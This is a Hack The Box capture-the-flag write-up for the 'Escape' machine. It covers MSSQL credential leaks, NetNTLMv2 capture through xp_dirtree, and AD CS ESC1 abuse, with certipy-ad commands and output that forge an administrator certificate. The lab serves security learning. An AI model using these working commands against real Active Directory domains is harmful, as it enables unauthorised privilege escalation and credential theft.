# HTB Escape

> **Platform:** Hack The Box
> **OS:** Windows (Active Directory + MSSQL + AD CS)
> **Domain:** `sequel.htb` — DC `DC` (`dc.sequel.htb`, `10.129.228.253`)
> **Difficulty:** Medium

## Attack Path Overview

1. **Recon** – DC also running **MSSQL 2019**.
2. **Guest SMB** – the `Public` share serves `SQL Server Procedures.pdf`, which leaks temp MSSQL creds `PublicUser : GuestUserCantWrite1`.
3. **MSSQL → Responder** – coerce the SQL service account to authenticate via `xp_dirtree`, capture `sql_svc`'s NetNTLMv2, crack → `REGGIE1234ronnie`.
4. **ERRORLOG loot** – as `sql_svc`, a SQL `ERRORLOG.BAK` records a failed login where `Ryan.Cooper` typed their password into the username field → `NuclearMosquito3`.
5. **AD CS ESC1** – the `UserAuthentication` template lets any Domain User supply an arbitrary SAN → request a cert as `administrator` → authenticate as DA.

## 5. AD CS ESC1 → Domain Admin

> You can triage AD CS with `sql_svc` first (`certipy-ad find ... -text -output certs` then grep `enrollment rights`), but the vulnerable template is enrollable by **Domain Users**, so `Ryan.Cooper` is enough.

### Step 5.1 — Find the vulnerable template

```bash
certipy-ad find -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -vulnerable -stdout
```

```
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Client Authentication               : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Requires Manager Approval           : False
    ...
    Enrollment Rights                   : SEQUEL.HTB\Domain Users ...
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

**ESC1**: `UserAuthentication` allows enrollee-supplied subject + Client Authentication, no manager approval, enrollable by Domain Users → request a cert as `administrator`.

### Step 5.2 — Request the certificate

```bash
certipy-ad req \
    -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' \
    -dc-ip '10.129.228.253' -target 'dc.sequel.htb' \
    -ca 'sequel-DC-CA' -template 'UserAuthentication' \
    -upn 'administrator@sequel.htb'
```

> ⚠️ **Mistake in the log:** the first run used `-upn 'administrator@corp.local'` (a copy-paste default), producing a cert with the wrong UPN (`administrator@corp.local`, "Certificate has no object SID"). Use the **real** domain — `administrator@sequel.htb`. Newer certipy also wants `-sid '<Administrator SID, e.g. S-1-5-21-...-500>'` to embed the SID.

This produces `administrator.pfx`.

### Step 5.3 — Authenticate → DA hash

Sync the clock first (the ~8h skew breaks Kerberos):

```bash
sudo rdate -n 10.129.228.253
certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.129.228.253'
```

## Lessons Learned

- **A DC running MSSQL is a pivot.** PDF-leaked `PublicUser` creds get you onto SQL Server with no real privileges.
- **`xp_dirtree` + Responder** coerces the SQL service account's NetNTLMv2 — a reliable way to turn low-priv SQL access into a crackable hash.
- **SQL error logs leak secrets**: users who paste a password into the username field get it logged in cleartext (`NuclearMosquito3`).
- **ESC1** (enrollee-supplies-subject + client auth, enrollable by Domain Users) → request a cert as `administrator`. Always use the **correct** `-upn` (and `-sid` on newer certipy), and fix clock skew before `certipy auth`.
